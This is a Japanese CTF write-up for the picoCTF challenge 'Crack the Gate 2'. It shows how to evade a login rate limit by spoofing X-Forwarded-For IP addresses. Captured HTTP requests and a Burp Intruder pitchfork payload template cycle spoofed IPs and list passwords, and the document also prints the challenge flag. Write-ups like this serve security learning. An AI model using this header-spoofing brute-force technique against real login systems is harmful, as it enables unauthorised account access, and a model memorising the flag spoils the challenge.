# Crack the Gate 2

## 解法
同じソースからの連続パスワード試行を時間で制限しているらしい。

適当なパスワードを入れてburpでヘッダーを見ると
```yaml
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:56866
Content-Length: 49
Accept-Language: ja
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:56866
Referer: http://amiable-citadel.picoctf.net:56866/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"ctf-player@picoctf.org","password":"a"}
```

というリクエストが送られていた。同じソースからの送信ではないと誤解させるために次のような要素を追加してみる。

- X-Forwarded-For: [偽装したいIP]

- X-Real-IP: [偽装したいIP]

- Client-IP: [偽装したいIP]

これは本来、プロキシを介するような通信をするときに本当のクライアントアドレスを教えるときに使うものであるが、```X-Forwarded-For: 192.168.0.1```と追加したときに時間制限が出なくなった。

後はburpのIntruder機能で```Pithchfork attack```を選択し、```number```に1~20を、```password```に配布されているパスワードリストを読み込んでアタックするとフラグが取れた。


***試したペイロード
```
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:56866
Content-Length: 49
Accept-Language: ja
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://amiable-citadel.picoctf.net:56866
Referer: http://amiable-citadel.picoctf.net:56866/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
X-Forwarded-For: 192.168.0.§number§

{"email":"ctf-player@picoctf.org","password":"§password§"}
```

```
picoCTF{xff_byp4ss_brut3_3477bf15}
```